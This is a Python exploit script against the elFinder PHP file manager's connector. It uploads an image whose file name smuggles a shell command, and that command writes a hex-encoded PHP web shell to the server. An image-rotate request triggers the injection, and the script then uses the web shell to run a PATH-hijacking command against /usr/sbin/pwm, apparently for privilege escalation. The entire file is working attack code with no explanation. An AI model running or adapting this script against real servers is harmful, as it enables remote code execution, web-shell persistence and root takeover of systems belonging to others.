import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py [URL]")
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}
    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
    return r.text

def shell(url, command, output_file="output.txt"):
    r = requests.get("%s/php/SecSignal.php?c=%s" % (url, command))
    
    if r.status_code == 200:

        with open(output_file, 'w') as f:
            f.write(r.text)
    else:
        print("[*] The site seems not to be vulnerable :(")

def main():
    usage()

    url = sys.argv[1]
    
    
    command = 'touch%20%2Ftmp%2Fid%20%26%26%20echo%20-e%20%27%23%21%2Fbin%2Fbash%5Cnecho%20%22uid%3D1000%28think%29%20gid%3D1000%28think%29%20groups%3D1000%28think%29%22%27%20%3E%20%2Ftmp%2Fid%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fid%20%26%26%20export%20PATH%3D%2Ftmp%3A%24PATH%20%26%26%20cd%20%2Ftmp%20%26%26%20%2Fusr%2Fsbin%2Fpwm'

    
    hash = upload(url, payload)

    
    imgRotate(url, hash)

    
    shell(url, command)  

if __name__ == "__main__":
    main()
